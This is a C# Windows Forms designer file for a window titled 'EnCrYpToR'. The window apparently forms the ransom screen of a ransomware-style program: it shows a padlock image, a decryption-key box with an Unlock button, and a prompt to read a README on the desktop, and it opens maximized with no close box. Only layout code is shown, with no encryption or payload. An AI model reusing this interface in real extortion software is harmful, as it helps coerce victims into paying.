namespace WinFormsApp1
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            textBox1 = new TextBox();
            button1 = new Button();
            label1 = new Label();
            pictureBox1 = new PictureBox();
            button2 = new Button();
            label2 = new Label();
            label3 = new Label();
            button3 = new Button();
            button4 = new Button();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            // 
            // textBox1
            // 
            textBox1.Location = new Point(211, 384);
            textBox1.Name = "textBox1";
            textBox1.Size = new Size(333, 23);
            textBox1.TabIndex = 0;
            // 
            // button1
            // 
            button1.AutoSize = true;
            button1.Location = new Point(550, 384);
            button1.Name = "button1";
            button1.Size = new Size(98, 25);
            button1.TabIndex = 1;
            button1.Text = "Unlock";
            button1.TextImageRelation = TextImageRelation.ImageAboveText;
            button1.UseVisualStyleBackColor = true;
            button1.Click += button1_Click;
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Location = new Point(116, 387);
            label1.Name = "label1";
            label1.Size = new Size(89, 15);
            label1.TabIndex = 2;
            label1.Text = "Decryption key:";
            // 
            // pictureBox1
            // 
            pictureBox1.Cursor = Cursors.No;
            pictureBox1.Image = Properties.Resources.padlock;
            pictureBox1.Location = new Point(0, 41);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(270, 320);
            pictureBox1.TabIndex = 3;
            pictureBox1.TabStop = false;
            // 
            // button2
            // 
            button2.Location = new Point(276, 151);
            button2.Name = "button2";
            button2.Size = new Size(150, 23);
            button2.TabIndex = 4;
            button2.Text = "Regenerate readme";
            button2.UseVisualStyleBackColor = true;
            button2.Click += button2_Click;
            // 
            // label2
            // 
            label2.Location = new Point(0, 0);
            label2.Name = "label2";
            label2.Size = new Size(100, 23);
            label2.TabIndex = 0;
            // 
            // label3
            // 
            label3.AutoEllipsis = true;
            label3.AutoSize = true;
            label3.Location = new Point(276, 133);
            label3.Name = "label3";
            label3.Size = new Size(457, 15);
            label3.TabIndex = 5;
            label3.Text = "What happened? Read the \"README\" file on your desktop. Can not find it? Click here:";
            label3.Click += label3_Click;
            // 
            // button3
            // 
            button3.Location = new Point(690, 384);
            button3.Name = "button3";
            button3.Size = new Size(98, 25);
            button3.TabIndex = 6;
            button3.Text = "EXIT";
            button3.UseVisualStyleBackColor = true;
            button3.Click += button3_Click;
            // 
            // button4
            // 
            button4.Location = new Point(329, 413);
            button4.Name = "button4";
            button4.Size = new Size(176, 38);
            button4.TabIndex = 7;
            button4.Text = "Manual Decryptor";
            button4.UseVisualStyleBackColor = true;
            button4.Click += button4_Click;
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            AutoSize = true;
            BackColor = Color.Gray;
            ClientSize = new Size(800, 450);
            ControlBox = false;
            Controls.Add(button4);
            Controls.Add(button3);
            Controls.Add(label3);
            Controls.Add(label2);
            Controls.Add(button2);
            Controls.Add(pictureBox1);
            Controls.Add(label1);
            Controls.Add(button1);
            Controls.Add(textBox1);
            Name = "Form1";
            ShowIcon = false;
            StartPosition = FormStartPosition.CenterScreen;
            Text = "EnCrYpToR";
            WindowState = FormWindowState.Maximized;
            Load += Form1_Load;
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private TextBox textBox1;
        private Button button1;
        private Label label1;
        private PictureBox pictureBox1;
        private Button button2;
        private Label label2;
        private Label label3;
        private Button button3;
        private Button button4;
    }
}
